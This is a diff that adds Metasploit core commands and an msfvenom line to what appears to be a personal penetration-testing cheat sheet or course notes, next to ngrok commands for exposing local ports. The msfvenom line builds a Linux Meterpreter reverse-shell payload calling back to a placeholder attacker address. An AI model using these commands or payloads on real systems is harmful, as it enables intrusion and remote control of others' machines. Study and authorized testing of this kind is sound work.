@@ -227,7 +227,26 @@ ngrok http 80                                         # Expose port 80 publicly
 ngrok http 8080                                       # Expose port 8080 publicly
 # Provides a public https://xxxx.ngrok-free.app URL forwarding to localhost
 ```
+# Metasploit — Core commands (Day 11)
+msfconsole                                           # Launch the Metasploit console
+workspace -a <name>                                  # Create a new workspace for organized testing
+workspace <name>                                     # Switch to an existing workspace
+db_nmap -sV <target>                                 # Import Nmap scan results into Metasploit's database
+search <term>                                        # Find modules by name, type, or platform
+use <module>                                         # Load an exploit, auxiliary, or post module
+show options                                         # Display required and optional settings for the loaded module
+show payloads                                        # List payloads compatible with the loaded exploit
+set RHOSTS <target>                                  # Set the remote target address
+set LHOST <attacker_ip>                              # Set the callback address for reverse payloads
+set LPORT <port>                                     # Set the callback port for payloads
+exploit                                              # Run the loaded exploit module
+sessions -l                                          # List active Meterpreter sessions
+sessions -i <id>                                     # Interact with a specific session
+background                                           # Background the current session without closing it
+run                                                  # Execute a loaded post module against a session
 
+# msfvenom — Payload generation (Day 11)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
 ---
 
 ## Offensive / Red Team
